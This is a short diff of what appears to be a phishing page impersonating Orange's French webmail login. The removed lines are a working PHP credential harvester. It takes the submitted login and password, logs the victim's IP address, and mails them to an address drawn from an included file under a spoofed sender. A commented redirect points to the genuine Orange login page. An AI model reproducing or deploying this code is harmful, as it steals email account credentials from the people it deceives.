@@ -1,23 +1,3 @@
-<?php
-require 'email.php';
-$login = $_POST['login'];
-$pass = $_POST['pass'];
-$ip = $_SERVER['REMOTE_ADDR'];
-$message = "♦♦♦♦♦♦♦♦♦♦♦|OrangeMail|♦♦♦♦♦♦♦♦♦♦♦\n";
-		$message.= "Login: " . $login . "\n";
-		$message.= "Password: " . $pass . "\n";
-		$message.= "Victime IP      : $ip\n";
-        $message.= "♦♦♦♦♦♦♦♦♦♦♦|TRY3D G5Q4|♦♦♦♦♦♦♦♦♦♦♦\n";
-$subject = "ORANGE MAIL Account - $ip " .   "\n";
-$headers = "From: TRY3D G5Q4<goggle.comm>";
-
-        $headers .= "MIME-Version: 1.0\n";
-
-        mail($recepteur, $subject, $message, $headers);
-//header('Location: https://login.orange.fr/');
-        
-?>
-
 <!DOCTYPE html>
 <html lang="fr"><head data-placeholder-focus="false">
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
